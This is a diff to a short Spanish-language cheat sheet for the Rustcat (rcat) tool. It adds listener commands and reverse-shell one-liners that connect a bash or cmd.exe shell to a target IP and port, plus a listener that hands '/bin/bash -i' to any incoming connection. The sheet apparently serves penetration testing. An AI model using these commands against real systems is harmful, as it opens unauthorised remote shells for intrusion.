@@ -1,23 +1,29 @@
 # Rustcat Cheat Sheet
 
-#### Ponerse en escucha en un puerto
+#### Ponerse en escucha en un puerto, usando comando de historial, completado de comando y bloqueo de ctrl-c
 ```
-rc -lp <PORT>
-```
-
-#### Ponerse en escucha en un puerto y poder usar el comando de history
-```
-rc -lpH <PORT>
+rcat -lp <PORT>
+rcat listen -ib <PORT>
 ```
 
-#### Ponerse en escucha en un puerto UDP
+#### Conectarse y crear una bash reverse shell (Linux)
 ```
-rc -lpu <PORT>
+rcat connect -s bash <IP-TARGET> <PORT-TARGET>
 ```
 
-#### Ponerse en escucha en un puerto especificando la IP del host
+#### Conectarse y crear un reverse shell (Windows)
 ```
-rc -l <IP-ADDRRESS> <PORT>
+rcat connect -s cmd.exe <IP-TARGET> <PORT-TARGET>
+```
+
+#### Escucha el puerto 55660 en localhost con historial de comandos y finalización de comandos e inicia un bash con modo interactivo en la conexión recibida:
+```
+rcat listen -ie "/bin/bash -i" 55660
+```
+
+#### Escucha el puerto 55660 en 0.0.0.0 con modo interactivo local:
+```
+rcat listen -l 55660
 ```
 
 ---
